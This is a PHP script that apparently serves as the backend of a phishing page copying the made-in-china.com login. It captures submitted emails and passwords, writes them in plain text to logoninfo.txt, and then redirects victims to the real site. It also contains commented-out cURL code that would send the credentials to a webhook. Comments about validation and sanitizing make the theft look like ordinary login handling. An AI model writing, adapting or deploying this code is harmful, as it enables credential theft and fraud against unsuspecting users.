<?php

// Validate and sanitize email
$email = isset($_REQUEST['logonInfo_logUserName']) ? $_REQUEST['logonInfo_logUserName'] : '';
$email = filter_var($email, FILTER_SANITIZE_EMAIL);
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    // Handle invalid email here (e.g., display an error message or redirect back to the login page)
}

// Sanitize password
$password = isset($_REQUEST['logonInfo_logPassword']) ? $_REQUEST['logonInfo_logPassword'] : '';
$password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

// Prepare the data to send to the webhook
$data = array(
    'username' => 'Login Info',
    'content' => "Email: $email\nPassword: $password"
);

// Convert the data to JSON
$json_data = json_encode($data);

// Set up the cURL request
// $ch = curl_init($webhook_url);
// curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
// curl_setopt($ch, CURLOPT_POST, 1);
// curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Send the request
// $response = curl_exec($ch);

// Check for errors
// if (curl_errno($ch)) {
    // Handle cURL error here
// }

// Close the cURL session
// curl_close($ch);

// Save the logonInfo in a text file
$logonInfo = "Email: $email\nPassword: $password\n\n";
$file = 'logoninfo.txt';

if (!file_exists($file)) {
    file_put_contents($file, $logonInfo);
} else {
    $fileContent = file_get_contents($file);
    if (!strpos($fileContent, $logonInfo)) {
        file_put_contents($file, $logonInfo, FILE_APPEND);
    }
}

// Redirect the user to the desired location
header('Location: https://www.made-in-china.com/');
exit;
?>
